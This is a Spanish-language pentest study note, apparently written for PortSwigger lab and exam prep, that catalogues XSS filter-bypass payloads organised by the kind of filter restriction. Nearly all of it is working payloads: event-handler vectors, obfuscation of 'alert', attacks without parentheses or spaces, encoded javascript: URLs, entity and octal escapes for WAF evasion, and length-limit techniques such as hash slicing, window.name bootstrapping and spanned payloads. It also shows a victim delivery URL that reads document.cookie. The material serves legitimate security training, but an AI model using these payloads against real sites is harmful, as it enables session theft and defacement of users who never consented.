---
aliases:
  - XSS bypass de filtros
  - XSS filter bypass
  - xss-bypass-filters
tags:
  - vuln/xss
  - filter-bypass
  - reference
---

# XSS — Bypass de filtros (por limitación)

> **Objetivo fijo:** ejecutar `alert(1)` (o `alert(document.domain)` / `print()` si el lab lo pide).
> La idea de esta nota: **partís de una limitación concreta** ("me filtran X") y ves **qué payloads podrían funcionar** para esa limitación.
> Contexto/breakout → [[vulnerabilities/002-xss/cheat-sheet|cheat sheet]] · sin `()` y encoding → [[vulnerabilities/019-obfuscacion/xss-obfuscation|xss-obfuscation]] · JS puro/keywords → [[vulnerabilities/019-obfuscacion/js-obfuscation|js-obfuscation]] · entry point → [[vulnerabilities/002-xss/README|XSS]]

> [!tip] 🧪 Regla de oro antes de improvisar: **fuzzeá**
> Cargá en **Burp Intruder** la lista de tags y la de event handlers (de la [cheat sheet oficial](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), botón *Copy tags/events to clipboard*). Mirá **cuáles se reflejan sin bloqueo** → esos son tu material. No adivines: descubrí qué pasa el filtro y recién ahí armás el vector.

## 🔎 Índice de limitaciones

| Me filtran / limitan… | Qué probar | Ir a |
| --- | --- | --- |
| `<script>` | tags con event handler (`img`/`svg`/`body`) | [[#1. Bloquean `<script>`\|§1]] |
| casi todos los **tags** | fuzz + custom tag `<xss>` / SVG | [[#2. Bloquean casi todos los tags\|§2]] |
| casi todos los **event handlers** | fuzz + `onbegin`/`onfocus`/`onhashchange` | [[#3. Bloquean casi todos los event handlers\|§3]] |
| la palabra **`alert`** | `alert` armado / otra función | [[#4. Bloquean la keyword `alert`\|§4]] |
| los **paréntesis `()`** | `throw`+`onerror`, backticks | [[#5. Bloquean los paréntesis\|§5]] |
| **espacios** | `/` como separador | [[#6. Bloquean espacios\|§6]] |
| **`javascript:`** en `href`/`src` | encoding del protocolo | [[#7. Filtran el protocolo `javascript:`\|§7]] |
| por **mayúsculas/patrón exacto** | mixed-case | [[#8. Filtro sensible a mayúsculas / patrón literal\|§8]] |
| `<` `>` pero inyecto en **atributo** | breakout de atributo | [[#9. Codifican `<>` pero caigo en un atributo\|§9]] |
| `<` `>` y caigo en **string JS** | breakout de string | [[#10. Codifican `<>` pero caigo en un string JS\|§10]] |
| **comillas** escapadas | `\` sin filtrar / entidades / backticks | [[#11. Escapan las comillas\|§11]] |
| **longitud** máxima | payloads cortos + técnicas DOM | [[#12. Límite de longitud\|§12]] |
| filtro de **firma** (WAF) por patrón | entidades HTML / octal / hex / null | [[#13. Encoding y entidades (fooling del WAF)\|§13]] |

---

## 1. Bloquean `<script>`

`<script>` es lo primero que filtran. Cambiá a un tag que ejecute por **event handler**:

<table>
<tr><th>Payload</th><th>Nota</th></tr>
<tr><td><code>&lt;img src=x onerror=alert(1)&gt;</code></td><td>El más fiable; funciona en <code>innerHTML</code>.</td></tr>
<tr><td><code>&lt;svg onload=alert(1)&gt;</code></td><td>Corto, dispara solo.</td></tr>
<tr><td><code>&lt;body onload=alert(1)&gt;</code></td><td>Si podés entrar como <code>body</code>.</td></tr>
<tr><td><code>&lt;iframe src=javascript:alert(1)&gt;</code></td><td>Protocolo <code>javascript:</code> en <code>src</code>.</td></tr>
</table>

## 2. Bloquean casi todos los tags

Fuzzeá primero (regla de oro). Cuando solo pasa **algo raro**:

- **Custom tag** (cuando bloquean los estándar): `<xss id=x onfocus=alert(1) tabindex=1></xss>` y navegás a `#x` (autofocus por fragmento). También `<x onclick=alert(1)>click</x>`.
- **SVG con animación** (cuando solo dejan pasar algo de SVG): `<svg><animatetransform onbegin=alert(1)>`.
- Recordá que el tag puede venir **mixed-case** (`<SvG>`) si el filtro es literal → §8.
- **Basura después del nombre del tag** (a veces alcanza): `<script/anyjunk>alert(1)</script>` · `<img/anyjunk/onerror=alert(1) src=a>`.
- **Null byte** dentro del tag/atributo para partir el patrón: `<img onerror=a%00lert(1) src=a>` · `<i%00mg onerror=alert(1) src=a>`.
- **"Tag shenanigans"** — el filtro borra `<script>` una vez y vos anidás para que quede uno válido: `<scr<script>ipt>alert(1)</script>` · `<script><script>alert(1)</script>` · `<scr<object>ipt>alert(1)</script>`.

## 3. Bloquean casi todos los event handlers

Fuzzeá la lista de handlers. Los que suelen sobrevivir y **disparan sin interacción**:

<table>
<tr><th>Handler</th><th>Vector</th></tr>
<tr><td><code>onbegin</code></td><td><code>&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;</code> — dispara solo.</td></tr>
<tr><td><code>onfocus</code> + <code>autofocus</code></td><td><code>&lt;input autofocus onfocus=alert(1)&gt;</code> — dispara al cargar.</td></tr>
<tr><td><code>onhashchange</code></td><td><code>&lt;body onhashchange=alert(1)&gt;</code> + entregar cambiando <code>#</code> por iframe.</td></tr>
<tr><td><code>onload</code></td><td><code>&lt;svg onload=alert(1)&gt;</code>.</td></tr>
</table>

## 4. Bloquean la keyword `alert`

Armá el nombre en runtime o llamá por otra vía:

```javascript
window['ale'+'rt'](1)          // concatenación
top['al'+'ert'](1)             // top / self / parent tambien sirven
self[atob('YWxlcnQ=')](1)      // 'alert' en base64
eval('ale'+'rt(1)')            // via eval
[].constructor.constructor('alert(1)')()   // Function() indirecto (útil con CSP laxa)
```

- Si el lab acepta **otra función**, `print()` o `confirm()` también son "ejecución probada". Confirmá qué pide el lab.

**Strings construidos dinámicamente** (cuando filtran `alert` o hasta el `.`):

```javascript
<script>eval('al'+'ert(1)')</script>          // concatenación
eval(atob('YWxlcnQoMSk='))                     // 'alert(1)' en base64
'alert(1)'.replace(/.+/,eval)                  // eval como callback, sin llamarlo directo
alert(document['cookie'])                      // sin punto: acceso por corchetes
```

## 5. Bloquean los paréntesis `()`

El caso clásico de ofuscación. Resumen (detalle → [[vulnerabilities/019-obfuscacion/xss-obfuscation|xss-obfuscation]]):

```javascript
onerror=alert;throw 1                 // onerror recibe lo que lanza throw
<img src=x onerror=alert`1`>          // backticks en vez de ()
<a href=javascript:alert%281%29>x</a> // () URL-encodeados en un href
window.onerror=eval;throw'=alert\x281\x29';  // eval + throw para payload arbitrario
```

## 6. Bloquean espacios

Usá `/` (o salto de línea / tab) como separador entre atributos:

```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>   <!-- tambien: reemplazá el espacio por %09 / %0a / %0c -->
```

**Sin espacios usando delimitadores de atributo.** Si el valor va entre comillas/backticks, el separador con el siguiente atributo se puede omitir:

```html
<img onerror="alert(1)"src=a>       <!-- comilla cierra, pega src sin espacio -->
<img onerror='alert(1)'src=a>
<img onerror=`alert(1)`src=a>
<img/onerror="alert(1)"src=a>       <!-- combinado con / tras el tag -->
<img src='a'onerror=alert(1)>       <!-- reordenar atributos -->
```

## 7. Filtran el protocolo `javascript:`

Cuando inyectás en `href`/`src`/`attr('href')` y bloquean la string literal:

```
JaVaScRiPt:alert(1)            // mixed-case (§8)
javascript&colon;alert(1)      // entidad HTML del :
java\tscript:alert(1)          // tab/newline/CR dentro de la keyword
&#106;avascript:alert(1)       // primer char como entidad decimal
```

## 8. Filtro sensible a mayúsculas / patrón literal

Si el filtro compara strings exactas, rompé el patrón con **mixed-case** (HTML no distingue mayúsculas en tags/handlers):

```html
<ScRiPt>alert(1)</sCrIpT>
<iMg SrC=x oNeRrOr=alert(1)>
```

## 9. Codifican `<>` pero caigo en un atributo

No necesitás `<>`: **rompés el atributo** y agregás tu handler. Si estás en `value="AQUÍ"`:

```html
"><svg onload=alert(1)>              <!-- si podés reintroducir <> -->
" autofocus onfocus="alert(1)        <!-- sin <>: cierro la comilla y agrego handler -->
" onmouseover="alert(1)              <!-- si hay interacción -->
```

## 10. Codifican `<>` pero caigo en un string JS

Estás dentro de `'AQUÍ'` o `` `AQUÍ` `` en un `<script>` ya existente. Salís del string:

```javascript
'-alert(1)-'                    // concatenación aritmética
';alert(1)//                    // cierro sentencia y comento el resto
</script><script>alert(1)</script>   // si </script> NO está filtrado
${alert(1)}                     // si el contexto es template literal `...`
```

## 11. Escapan las comillas

Si escapan `'` → `\'` **pero no filtran la barra `\`**, rompés el escape:

```javascript
\'-alert(1)//                   // tu \ neutraliza el \ del server → la ' cierra
```

Alternativas cuando las comillas no sirven:

```javascript
alert(document.domain)          // sin string literal
`${alert(1)}`                   // template literal (no usa comillas simples/dobles)
&apos;-alert(1)-&apos;          // en handler que decodifica entidades HTML
```

## 12. Límite de longitud

Payloads mínimos que igual disparan:

```html
<svg onload=alert(1)>           <!-- 20 chars -->
<img src onerror=alert(1)>
<svg/onload=alert`1`>           <!-- sin espacios ni () -->
```

Tres técnicas de PortSwigger para cuando el límite es agresivo (documentadas acá por si la ref se cae; refs al final del bloque):

### 12.a — Hash slicing (DOM): el payload va en el `#` de la URL

La clave: **lo que va después de `#` (el fragmento) NO se manda al server** → no cuenta contra el límite reflejado ni pasa por el filtro server-side. En el punto de inyección metés solo un **stub corto** que lee la URL actual y evalúa el fragmento:

```html
<script>eval(location.hash.slice(1))</script>
```

O más corto, por event handler (sirve si no pasa `<script>`):

```html
<img src onerror=eval(location.hash.slice(1))>
```

- `location.hash` = el fragmento **con** el `#` (ej. `#alert(document.cookie)`); `.slice(1)` le saca el `#`.
- El **payload real, sin límite**, viaja en la URL que le entregás a la víctima:

```
https://TARGET/?q=<img%20src%20onerror%3deval(location.hash.slice(1))>#alert(document.cookie)
```

- Si el navegador **percent-encodea** el fragmento, decodificá primero:

```html
<img src onerror=eval(decodeURIComponent(location.hash.slice(1)))>
```

> El stub cuenta contra el límite; el payload grande no. Por eso conviene el stub más corto que pase el filtro.

### 12.b — Shortened: acortar el payload

Dos vías (PortSwigger):

1. **APIs más cortas + sacar caracteres innecesarios**: `<svg/onload=alert`1`>` (sin espacios ni `()`).
2. **Bootstrap con `window.name`**: el payload grande vive en `window.name` (persiste al navegar en la misma pestaña); en el target solo inyectás el stub mínimo:

   ```html
   <img src onerror=eval(name)>
   ```

   El payload real lo dejás en `window.name` desde una página tuya: un **iframe oculto** setea `window.name` y redirige el iframe al target vulnerable (`name` == `window.name`).

### 12.c — Spanned: repartir el payload en varios campos

Cuando hay **varios parámetros reflejados** (cada uno con su límite chico) que caen **en orden** en la respuesta, abrís un comentario de bloque JS al final de un trozo y lo cerrás al principio del siguiente → el **HTML del medio queda comentado** y tu código **se estira** a través de los campos:

```
param1 = <script>/*
param2 = */alert(1)/*
param3 = */</script>
```

Queda renderizado así (lo que está entre `/* */` se ignora):

```html
<script>/*  ...markup entre param1 y param2...  */alert(1)/*  ...markup...  */</script>
```

**Refs (PortSwigger Support):** [DOM/hash slicing](https://portswigger.net/support/xss-filters-beating-length-limits-using-dom-based-techniques) · [shortened](https://portswigger.net/support/xss-filters-beating-length-limits-using-shortened-payloads) · [spanned](https://portswigger.net/support/xss-filters-beating-length-limits-using-spanned-payloads)

## 13. Encoding y entidades (fooling del WAF)

Cuando el filtro es **por firma** (busca `alert`, `javascript`, etc.), el navegador **decodifica** entidades/escapes antes de ejecutar, así que ofuscás sin romper el payload. Detalle y generador → [[vulnerabilities/019-obfuscacion/encodings|encodings]].

**Entidades HTML dentro de un atributo/handler** (el browser las decodifica):

```html
<img onerror=a&#x6c;ert(1) src=a>       <!-- 'l' como entidad hex -->
<img onerror=a&#108;ert(1) src=a>       <!-- decimal -->
```

Jugá con las **deviaciones** que muchos filtros no contemplan: ceros a la izquierda y **sin `;` final**:

```
&#x06c;  &#x006c;  &#0108;  &#108ert   <!-- todas decodifican a 'l' -->
```

**Escapes dentro de un string JS** (octal / hex); podés escapar hasta caracteres que **no lo necesitan** para engañar al filtro:

```javascript
eval('a\154ert(1)')     // octal:  \154 = 'l'
eval('a\x6cert(1)')     // hex:    \x6c = 'l'
eval('a\l\ert\(1)')     // escape "inútil" que igual ejecuta
```

**Combinar capas** (lo que rompe WAFs): Unicode-escape de una letra + el backslash HTML-encodeado:

```html
<img onerror=eval('al&#x5c;u0065rt(1)') src=a>   <!-- &#x5c; = \  →  e = 'e' -->
```

> [!tip] 🔧 CyberChef para generarlas
> Operaciones útiles: *To HTML Entity* (probá con/sin `;`, ceros a la izquierda), *Escape Unicode Characters*, *To Octal*, *To Hex*. Aplicá el encoding a **todo** el payload o **solo a partes** (a veces alcanza con ofuscar una letra de `alert`).

---

## 🧭 Chuleta de decisión rápida

| Situación | Primer intento |
| --- | --- |
| No sé qué pasa el filtro | **Fuzz** tags + handlers con Intruder |
| `<script>` no | `<img src=x onerror=alert(1)>` |
| Solo pasa SVG | `<svg onload=alert(1)>` / `<animatetransform onbegin=alert(1)>` |
| Bloquean `()` | `onerror=alert;throw 1` o `alert\`1\`` |
| Bloquean `alert` | `window['ale'+'rt'](1)` |
| Estoy en atributo, sin `<>` | `" autofocus onfocus="alert(1)` |
| Estoy en string JS | `'-alert(1)-'` o `';alert(1)//` |
| Escapan `'` pero no `\` | `\'-alert(1)//` |

> [!note] Ver también (dentro del vault)
> - Ofuscación profunda (sin `()`, keywords, `\xNN`) → [[vulnerabilities/019-obfuscacion/xss-obfuscation|xss-obfuscation]] · [[vulnerabilities/019-obfuscacion/js-obfuscation|js-obfuscation]].
> - Encoding por objetivo (HTML/URL/doble) → [[vulnerabilities/019-obfuscacion/encodings|encodings]].
> - Vectores base y breakout por contexto → [[vulnerabilities/002-xss/cheat-sheet|cheat sheet]].

## 📚 Referencias externas

| Recurso | Para qué sirve |
| --- | --- |
| [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) | **La más importante.** Interactiva; *Copy tags/events to clipboard* para fuzzear con Intruder qué pasa el filtro. |
| [PortSwigger — length limits (DOM)](https://portswigger.net/support/xss-filters-beating-length-limits-using-dom-based-techniques) | Hash slicing y otras técnicas DOM para límites de longitud (§12). |
| [PortSwigger — length limits (shortened)](https://portswigger.net/support/xss-filters-beating-length-limits-using-shortened-payloads) | Payloads acortados. |
| [PortSwigger — length limits (spanned)](https://portswigger.net/support/xss-filters-beating-length-limits-using-spanned-payloads) | Payloads repartidos en varios campos. |
| [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) | Catálogo clásico de evasión de filtros. |
| [0xVIC — WAF bypasses](https://github.com/0xVIC/CheatSheets/blob/master/Cross-site%20scripting/WAF_bypasses.md) | Colección enfocada en bypass de WAF. |
| [burp_xss_restriction_bypass_checker](https://github.com/whoishacked/burp_xss_restriction_bypass_checker) | Herramienta: chequea qué restricciones aplica el target. |
| [n3t-hunt3r pentest-book](https://n3t-hunt3r.gitbook.io/pentest-book/) | Notas generales de pentest (incluye XSS). |
| [rocky_rowdy — XSS cheatsheet](https://medium.com/@rocky_rowdy/xss-cheatsheet-a49e5cc16fbd) | Cheatsheet alternativa. |

> Fuente de estas referencias: notas de examen de pawlokk (`burp-exam-notes/XSS-BYPASS.txt`).
